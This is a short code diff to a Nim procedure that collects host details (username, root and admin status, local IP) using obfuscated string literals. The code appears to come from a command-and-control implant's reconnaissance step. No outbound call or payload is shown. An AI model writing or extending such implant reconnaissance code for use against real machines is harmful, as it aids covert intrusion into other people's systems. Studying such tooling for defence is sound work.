@@ -10,6 +10,7 @@ import nimprotect
 import strformat
 import strutils
 import osproc
+import posix
 import crc32
 import net
 import os
@@ -59,21 +60,24 @@ proc collect_data(): bool =
     except:
         process = could_not_retrieve
     try:
-        username = execCmdEx(protectString("whoami"), options={poDaemon})[0].replace("\n", "")
+        let pw = getpwuid(geteuid())
+        username = if pw != nil: $pw.pw_name else: could_not_retrieve
     except:
         username = could_not_retrieve
-    if username == protectString("root"):
-        is_admin = protectString("True")
-        is_elevated = protectString("True")
-    else: 
-        try:
-            if protectString("(sudo)") in execCmdEx(protectString("id"))[0]:
+    try:
+        if geteuid() == 0:
+            is_elevated = protectString("True")
+            is_admin = protectString("True")
+        else:
+            is_elevated = protectString("False")
+            if getuid() == 0:
                 is_admin = protectString("True")
             else:
                 is_admin = protectString("False")
-        except:
-            is_admin = could_not_retrieve
-        is_elevated = protectString("False")
+    except:
+        is_admin = could_not_retrieve
+        is_elevated = could_not_retrieve
+
     try:
         ipv4_local = $getPrimaryIPAddr()
     except:
